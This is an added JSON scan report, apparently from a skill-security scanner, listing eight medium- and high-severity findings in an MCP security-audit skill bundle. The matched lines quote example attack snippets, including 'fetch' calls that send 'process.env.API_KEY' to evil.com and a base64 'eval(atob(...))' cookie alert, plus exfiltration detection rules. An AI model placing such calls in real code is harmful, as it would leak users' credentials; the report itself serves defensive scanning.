@@ -1,0 +1,92 @@
+{
+  "source": "mcp-security-audit",
+  "source_url": "mcp-security-audit",
+  "bundle_hash": "sha256:445e4d974f08168dcace0e299568cd215645408f1544311eb40ab57b60b61808",
+  "scanner_version": "skills-guard-v1",
+  "verdict": "caution",
+  "trust_level": "community",
+  "findings": [
+    {
+      "pattern_id": "js_base64",
+      "severity": "medium",
+      "category": "obfuscation",
+      "file": "README.md",
+      "line": 95,
+      "match": "eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))",
+      "description": "JavaScript base64 encode/decode"
+    },
+    {
+      "pattern_id": "remote_fetch",
+      "severity": "medium",
+      "category": "supply_chain",
+      "file": "README.md",
+      "line": 101,
+      "match": "fetch('https://evil.com?token=' + process.env.API_KEY)",
+      "description": "fetches remote resource at runtime"
+    },
+    {
+      "pattern_id": "git_clone",
+      "severity": "medium",
+      "category": "supply_chain",
+      "file": "README.md",
+      "line": 85,
+      "match": "git clone <mcp-server-repo>",
+      "description": "clones a git repository at runtime"
+    },
+    {
+      "pattern_id": "git_clone",
+      "severity": "medium",
+      "category": "supply_chain",
+      "file": "skill-card.md",
+      "line": 22,
+      "match": "Risk: Audit commands such as npm audit, pip-audit, grep, and git clone may be run against untrusted MCP server packag...",
+      "description": "clones a git repository at runtime"
+    },
+    {
+      "pattern_id": "ssh_dir_access",
+      "severity": "high",
+      "category": "exfiltration",
+      "file": "SKILL.md",
+      "line": 50,
+      "match": "\u25a1 Flag any access to ~/.ssh, ~/.config, env files",
+      "description": "references user SSH directory"
+    },
+    {
+      "pattern_id": "python_os_environ",
+      "severity": "high",
+      "category": "exfiltration",
+      "file": "SKILL.md",
+      "line": 134,
+      "match": "3. **Environment variable exfil** - Sending `process.env` or `os.environ` externally",
+      "description": "accesses os.environ (potential env dump)"
+    },
+    {
+      "pattern_id": "js_base64",
+      "severity": "medium",
+      "category": "obfuscation",
+      "file": "SKILL.md",
+      "line": 132,
+      "match": "1. **Obfuscated code** - `eval(atob('...'))` or similar",
+      "description": "JavaScript base64 encode/decode"
+    },
+    {
+      "pattern_id": "remote_fetch",
+      "severity": "medium",
+      "category": "supply_chain",
+      "file": "SKILL.md",
+      "line": 201,
+      "match": "fetch('https://evil.com/steal?token=' + process.env.API_KEY);",
+      "description": "fetches remote resource at runtime"
+    }
+  ],
+  "rules": [
+    "git_clone",
+    "js_base64",
+    "python_os_environ",
+    "remote_fetch",
+    "ssh_dir_access"
+  ],
+  "scanned_at": "2026-07-30T00:56:06.294291+00:00",
+  "summary": "mcp-security-audit: caution \u2014 8 finding(s) in exfiltration, obfuscation, supply_chain",
+  "fresh": true
+}
